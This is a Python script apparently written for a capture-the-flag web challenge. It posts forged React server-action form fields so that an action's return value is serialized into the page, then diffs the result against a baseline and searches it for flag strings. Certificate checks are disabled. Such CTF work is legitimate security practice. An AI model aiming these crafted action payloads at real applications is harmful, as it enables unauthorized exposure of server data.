#!/usr/bin/env python3
"""
Try sending $ACTION_KEY along with $ACTION_REF (form-state action) so that
the action's return value gets serialized into the rendered page as form state.
"""
import urllib.request, urllib.error, ssl

URL = "https://funicular-gm2cxozn.alfactf.ru/"
ACTION_ID = "40c6382106bb726484f31b3ebc21b7476819a1cccf"

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def fetch(method, headers=None, body=None):
    r = urllib.request.Request(URL, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(r, context=ctx, timeout=30) as resp:
            return resp.status, dict(resp.headers), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read()


def multipart(fields):
    boundary = "----X1234ABC"
    parts = []
    for k, v in fields:
        parts.append(f"--{boundary}\r\n".encode())
        parts.append(f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode())
        parts.append(v.encode() if isinstance(v, str) else v)
        parts.append(b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(parts)


# decodeFormState requires $ACTION_KEY (the form key path) AND $ACTION_REF_<id>
# with $ACTION_<id>:0 = '{"id":"...","bound":null}'
descriptor = '{"id":"' + ACTION_ID + '","bound":null}'

fields = [
    (f"$ACTION_REF_{ACTION_ID}", ""),
    (f"$ACTION_{ACTION_ID}:0", descriptor),
    ("$ACTION_KEY", "myform"),
]

boundary, body = multipart(fields)
s, h, d = fetch("POST", {"Content-Type": f"multipart/form-data; boundary={boundary}"}, body)
print(f"status={s} len={len(d)}")
# Save and search for differences from baseline
open("/tmp/post_with_key.html", "wb").write(d)

# Compare to baseline
sg, _, base = fetch("GET")
import difflib
diffs = []
for i, (a, b) in enumerate(zip(base, d)):
    if a != b:
        diffs.append(i)
        if len(diffs) > 30:
            break
print(f"first diffs at: {diffs[:20]}")
if diffs:
    i = diffs[0]
    print(f"BL[i-50:i+200]: {base[max(0,i-50):i+300].decode('utf-8','replace')}")
    print(f"CD[i-50:i+200]: {d[max(0,i-50):i+300].decode('utf-8','replace')}")

# Look for any new strings
for n in (b"alfa{", "флаг".encode(), b"FLAG", b"recover", b"backup", "восстанов".encode(), b'"restored":true'):
    if n in d and n not in base:
        i = d.find(n)
        print(f"NEW {n!r}: {d[max(0,i-80):i+200]}")
